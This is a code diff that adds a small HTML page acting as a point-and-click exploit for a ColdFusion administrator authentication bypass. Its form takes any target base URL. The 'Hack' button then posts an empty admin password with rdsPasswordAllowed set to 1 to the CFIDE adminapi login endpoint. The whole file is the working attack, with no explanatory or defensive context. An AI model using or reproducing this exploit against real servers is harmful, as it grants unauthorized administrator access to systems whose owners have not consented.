@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<title></title>
+</head>
+<body>
+
+	<h1>Test for Coldfusion Admin Bypass</h1>
+	<p>Input the base url below</p>
+
+	<form name="urlform" action="#">
+		URL: <input type="text" name="url" id="input">	
+	</form>
+	<button type="button" onclick="cf_test()">Hack</button>
+
+
+    <form action="#" method="post" name="cf_form">
+    <input name="adminpassword" type="hidden" value="" />
+        <input name="rdsPasswordAllowed" type="hidden" value="1" />
+    </form>
+
+    <script>
+    	function cf_test() {
+
+    		URL = document.forms["urlform"]["url"].value + "/CFIDE/adminapi/administrator.cfc?method=login";
+
+    		cf_form.action = URL;
+
+    		cf_form.submit();
+    	}
+    </script>
+
+
+</body>
+</html>
+
+
